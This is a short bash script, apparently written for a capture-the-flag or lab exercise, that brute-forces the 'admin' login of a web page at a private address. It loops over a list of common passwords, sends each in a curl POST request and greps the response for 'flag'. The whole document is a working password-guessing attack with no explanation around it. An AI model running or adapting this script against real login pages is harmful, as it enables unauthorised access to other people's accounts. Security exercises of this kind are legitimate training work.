#!/bin/bash

password=(123456 password 12345678 azerty qwerty abc123 123456789 111111 1234567 iloveyou 123123 admin Admin 1234567890 letmein 1234 monkey shadow sunshine 12345 password1 princess trustno1 000000)

for i in ${password[@]}; do
	curl -X POST "http://192.168.0.33/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
done
